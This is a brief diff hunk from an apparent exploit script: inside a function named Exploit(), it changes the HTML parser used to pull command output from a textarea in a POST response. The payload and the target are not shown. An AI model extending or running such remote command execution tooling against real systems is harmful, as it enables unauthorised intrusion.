@@ -69,7 +69,7 @@ def Exploit():
 			response = requests.post(url = Url,data = data,headers = headers,verify = False,timeout = 10)
 			if(response.status_code == 200):
 				#print(response.text)
-				soup = BeautifulSoup(response.text,'lxml')
+				soup = BeautifulSoup(response.text,'html.parser')
 				CmdShow = soup.textarea.text
 				print(CmdShow)
 			else:
